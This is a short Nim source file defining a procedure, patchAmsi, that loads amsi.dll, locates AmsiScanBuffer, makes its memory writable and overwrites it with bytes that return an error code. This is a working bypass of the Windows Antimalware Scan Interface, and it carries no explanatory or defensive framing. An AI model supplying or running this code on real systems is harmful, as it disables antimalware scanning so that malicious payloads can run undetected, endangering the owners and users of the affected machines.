import winim/lean
import dynlib

when defined(amd64):
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined(i386):
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc patchAmsi*(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    amsi = loadLib("amsi")
    if isNil(amsi):
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer")
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled
